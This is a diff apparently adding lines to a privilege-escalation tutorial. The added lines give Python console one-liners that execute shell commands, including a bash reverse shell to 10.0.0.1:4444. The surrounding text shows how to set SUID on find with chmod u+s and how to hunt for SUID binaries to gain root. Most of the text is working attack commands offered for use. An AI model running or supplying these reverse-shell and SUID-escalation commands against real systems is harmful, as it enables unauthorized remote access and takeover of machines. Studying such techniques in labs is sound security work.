@@ -1,3 +1,10 @@
+Launch the following codes on the console to get a reverse shell
+__import__('os').popen('whoami').read();
+import os; print(os.popen("whoami").read())
+
+# Reverse shell
+__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read()
+
 Prior to the attack, we first create an SUID executable vulnerability in order to demonstrate the exploitation. Next we run the following command on the Find command:
 chmod u+s /usr/bin/find
 This enables SUID permission on Find so that we as the attacker can exploit and launch Find as root user. As we now have access to victim’s machine, we will use Find command to identify binaries having SUID permission:
